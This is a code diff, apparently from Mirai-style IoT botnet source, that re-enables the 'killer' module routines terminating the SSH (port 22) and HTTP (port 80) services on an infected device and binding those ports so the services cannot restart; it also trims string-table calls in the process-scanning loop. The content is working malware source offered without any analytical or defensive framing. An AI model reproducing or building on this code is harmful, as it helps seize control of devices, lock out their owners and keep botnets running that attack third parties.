@@ -64,44 +64,44 @@ void killer_init(void)
 #endif
 
     // Kill SSH service and prevent it from restarting
-//#ifdef KILLER_REBIND_SSH
-//    if (killer_kill_by_port(htons(22)))
-//    {
-//#ifdef DEBUG
-//        printf("[killer] Killed tcp/22 (SSH)\n");
-//#endif
-//    }
-//    tmp_bind_addr.sin_port = htons(22);
-//
-//    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
-//    {
-//        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
-//        listen(tmp_bind_fd, 1);
-//    }
-//#ifdef DEBUG
-//    printf("[killer] Bound to tcp/22 (SSH)\n");
-//#endif
-//#endif
+#ifdef KILLER_REBIND_SSH
+    if (killer_kill_by_port(htons(22)))
+    {
+#ifdef DEBUG
+        printf("[killer] Killed tcp/22 (SSH)\n");
+#endif
+    }
+    tmp_bind_addr.sin_port = htons(22);
+
+    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
+    {
+        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
+        listen(tmp_bind_fd, 1);
+    }
+#ifdef DEBUG
+    printf("[killer] Bound to tcp/22 (SSH)\n");
+#endif
+#endif
 
     // Kill HTTP service and prevent it from restarting
-//#ifdef KILLER_REBIND_HTTP
-//    if (killer_kill_by_port(htons(80)))
-//    {
-//#ifdef DEBUG
-//        printf("[killer] Killed tcp/80 (http)\n");
-//#endif
-//    }
-//    tmp_bind_addr.sin_port = htons(80);
-//
-//    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
-//    {
-//        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
-//        listen(tmp_bind_fd, 1);
-//    }
-//#ifdef DEBUG
-//    printf("[killer] Bound to tcp/80 (http)\n");
-//#endif
-//#endif
+#ifdef KILLER_REBIND_HTTP
+    if (killer_kill_by_port(htons(80)))
+    {
+#ifdef DEBUG
+        printf("[killer] Killed tcp/80 (http)\n");
+#endif
+    }
+    tmp_bind_addr.sin_port = htons(80);
+
+    if ((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
+    {
+        bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof (struct sockaddr_in));
+        listen(tmp_bind_fd, 1);
+    }
+#ifdef DEBUG
+    printf("[killer] Bound to tcp/80 (http)\n");
+#endif
+#endif
 
     // In case the binary is getting deleted, we want to get the REAL realpath
     sleep(5);
@@ -170,7 +170,6 @@ void killer_init(void)
 
             table_unlock_val(TABLE_KILLER_PROC);
             table_unlock_val(TABLE_KILLER_EXE);
-            table_unlock_val(TABLE_KILLER_STATUS);
 
             // Store /proc/$pid/exe into exe_path
             ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
@@ -184,7 +183,6 @@ void killer_init(void)
 
             table_lock_val(TABLE_KILLER_PROC);
             table_lock_val(TABLE_KILLER_EXE);
-            table_lock_val(TABLE_KILLER_STATUS);
 
             // Resolve exe_path (/proc/$pid/exe) -> realpath
             if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
